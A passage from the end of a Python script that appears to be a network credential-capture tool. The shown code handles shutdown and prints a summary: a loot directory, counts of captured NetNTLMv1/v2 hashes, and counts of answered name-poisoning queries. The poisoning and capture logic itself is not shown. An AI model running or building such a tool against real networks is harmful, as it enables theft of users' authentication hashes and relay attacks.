                      % args.poison_cidr))
    else:
        print(Color.d("  no poisoning / no relay — point coerced auth here "
                      "yourself."))
    print(Color.d("  Ctrl-C to stop.\n"))

    stop_event = threading.Event()
    old_handlers = {}

    def request_stop(signum, frame):
        stop_event.set()

    for stop_signal in (signal.SIGINT, signal.SIGTERM):
        try:
            old_handlers[stop_signal] = signal.signal(stop_signal, request_stop)
        except (AttributeError, ValueError):
            pass

    try:
        stop_event.wait()
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        for stop_signal, old_handler in old_handlers.items():
            try:
                signal.signal(stop_signal, old_handler)
            except (ValueError, OSError):
                pass
        if split_view:
            split_view.close()
            sys.stdout = (_Tee(original_stdout, session_fh)
                          if session_fh else original_stdout)
        print("\n" + Color.b("[*] Stopping listeners..."))
        if wire_monitor:
            wire_monitor.close()
        if poisoner:
            poisoner.close()
        for s in servers:
            s.shutdown()
            s.server_close()
        print(Color.g("[*] Stopped cleanly."))
        print(Color.d("    Loot directory: %s/" % args.outdir))
        print("    Captures      : %d total (%d NetNTLMv1, %d NetNTLMv2)"
              % (stats["captures_total"], stats["captures_v1"], stats["captures_v2"]))
        print("    Connections   : %d accepted" % stats["connections"])
        if poisoner:
            print("    Name queries  : %d observed, %d answered" %
                  (poisoner.queries, poisoner.answers))
        sys.stdout.flush()
        sys.stdout = original_stdout
        if session_fh:
            session_fh.close()


if __name__ == "__main__":
    main()
